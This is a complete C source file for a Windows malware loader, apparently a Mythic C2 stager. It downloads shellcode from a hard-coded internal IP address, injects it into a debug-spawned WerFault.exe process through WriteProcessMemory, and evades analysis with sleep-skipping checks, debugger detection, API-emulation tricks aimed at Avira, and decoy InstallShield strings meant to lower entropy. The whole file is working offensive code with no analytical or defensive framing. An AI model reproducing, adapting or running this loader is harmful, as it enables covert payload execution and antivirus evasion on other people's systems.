#include <Windows.h>
#include <stdio.h>
#include <WinInet.h>
#include <Tlhelp32.h>
#pragma comment (lib, "Wininet.lib")

//CreateProcess target
#define TARGET_PROCESS_PATH		L"C:\\Windows\\System32\\WerFault.exe"
#define GET_FILENAMEW(PATH)		(wcsrchr((PATH), L'/') ? wcsrchr((PATH), L'/') + 1 : (wcsrchr((PATH), L'\\') ? wcsrchr((PATH), L'\\') + 1 : (PATH)))
//shellcode address
#define PAYLOAD L"http://192.168.0.122/stager.bin"

//lowering entropy by simulating InstallShield setup application strings
const unsigned char a1[] = "InstallShield Setup is preparing the InstallShield Wizard which will guide you through the program setup process. Please wait.";
const unsigned char a2[] = "Next";
const unsigned char a3[] = "Back";
const unsigned char a4[] = "Finish";
const unsigned char a5[] = "Agree";
const unsigned char a6[] = "Cancel";
const unsigned char a7[] = "Extracting %s";
const unsigned char a8[] = "WARNING: This program is protected by copyright law and international treaties.";
const unsigned char a9[] = "The InstallShield(R) Wizard will install %s on your computer. To continue, click Next.";
const unsigned char a0[] = "I accept the terms in the license agreement";
const unsigned char a11[] = "I do not accept the terms in the license agreement";
const unsigned char a12[] = "Back";
const unsigned char a13[] = "Change...";
const unsigned char a14[] = "Install";
const unsigned char a15[] = "Modify";
const unsigned char a16[] = "Repair";
const unsigned char a17[] = "Remove";

//download the payload
BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {

	BOOL		bSTATE = TRUE;
	HINTERNET	hInternet = NULL,
				hInternetFile = NULL;
	DWORD		dwBytesRead = NULL;
	SIZE_T		sSize = NULL; 	 			// Used as the total payload size
	PBYTE		pBytes = NULL,					// Used as the total payload heap buffer
				pTmpBytes = NULL;					// Used as the tmp buffer (of size 1024)

	hInternet = InternetOpenW(L"Mythic", NULL, NULL, NULL, NULL);
	if (hInternet == NULL) {
		bSTATE = FALSE; goto _EndOfFunction;
	}

	hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	if (hInternetFile == NULL) {
		bSTATE = FALSE; goto _EndOfFunction;
	}

	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
	if (pTmpBytes == NULL) {
		bSTATE = FALSE; goto _EndOfFunction;
	}

	while (TRUE) {

		if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
			bSTATE = FALSE; goto _EndOfFunction;
		}

		sSize += dwBytesRead;

		if (pBytes == NULL)
			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
		else
			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);
		if (pBytes == NULL) {
			bSTATE = FALSE; goto _EndOfFunction;
		}

		memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
		memset(pTmpBytes, '\0', dwBytesRead);

		if (dwBytesRead < 1024) {
			break;
		}
	}

	*pPayloadBytes = pBytes;
	*sPayloadSize = sSize;

_EndOfFunction:
	if (hInternet)
		InternetCloseHandle(hInternet);											
	if (hInternetFile)
		InternetCloseHandle(hInternetFile);										
	if (hInternet)
		InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);	
	if (pTmpBytes)
		LocalFree(pTmpBytes);													
	return bSTATE;
}

int main() {

	//Evasion part 1 - check for sleep forwarding
	DWORD startTime = GetTickCount();
	Sleep(2000);
	double elapsedTime = (GetTickCount() - startTime) / 1000.0;
	if (elapsedTime < 1.5) {
		return -1;
	}

	//Evasion part 2 - check if debugger is present
	if (IsDebuggerPresent()) {
		return -2;
	}

	//Evasion part 3 - API emulation (needed for AVIRA AV)
	PVOID ev3 = FlsAlloc(0);
	if (ev3 == NULL) {
		return -3;
	}

	//Evasion part 4 - API emulation 2 (doesn't really affect detection)
	PVOID ev4 = VirtualAllocExNuma(GetCurrentProcess(), NULL, 0x1000, 0x3000, 0x4, 0);
	if (ev4 == NULL) {
		return -4;
	}

	STARTUPINFOW			StartupInfo = { .cb = sizeof(STARTUPINFOW) };
	PROCESS_INFORMATION		ProcessInfo = { 0 };
	WCHAR				    szTargetProcess[MAX_PATH] = TARGET_PROCESS_PATH;
	DEBUG_EVENT			    DebugEvent = { 0 };
	SIZE_T				    sNumberOfBytesWritten = 0x00;

	SIZE_T					shellcodeSize = NULL;
	PBYTE					shellcode = NULL;

	if (!CreateProcessW(szTargetProcess, NULL, NULL, NULL, FALSE, DEBUG_ONLY_THIS_PROCESS, NULL, NULL, &StartupInfo, &ProcessInfo)) {
		return -1;
	}

	//Download the payload
	if (!GetPayloadFromUrl(PAYLOAD, &shellcode, &shellcodeSize)) {
		return -2;
	}

	// Parsing all debug events
	while (WaitForDebugEvent(&DebugEvent, INFINITE)) {

		switch (DebugEvent.dwDebugEventCode) {

			// New thread creation
		case CREATE_THREAD_DEBUG_EVENT: {

			if (!WriteProcessMemory(ProcessInfo.hProcess, DebugEvent.u.CreateProcessInfo.lpStartAddress, shellcode, shellcodeSize, &sNumberOfBytesWritten) || sNumberOfBytesWritten != shellcodeSize) {
				return -3;
			}

			// Detach child process
			if (!DebugActiveProcessStop(ProcessInfo.dwProcessId)) {
				return -4;
			}

			// Resume thread creation
			ContinueDebugEvent(DebugEvent.dwProcessId, DebugEvent.dwThreadId, DBG_CONTINUE);

			// Exit
			goto _END_OF_FUNC;
		};

		case EXIT_PROCESS_DEBUG_EVENT:
			return 0;

		default:
			break;
		}
		ContinueDebugEvent(DebugEvent.dwProcessId, DebugEvent.dwThreadId, DBG_CONTINUE);
	}

_END_OF_FUNC:
	HeapFree(GetProcessHeap(), 0, shellcode);
	CloseHandle(ProcessInfo.hProcess);
	CloseHandle(ProcessInfo.hThread);
	return 0;
}
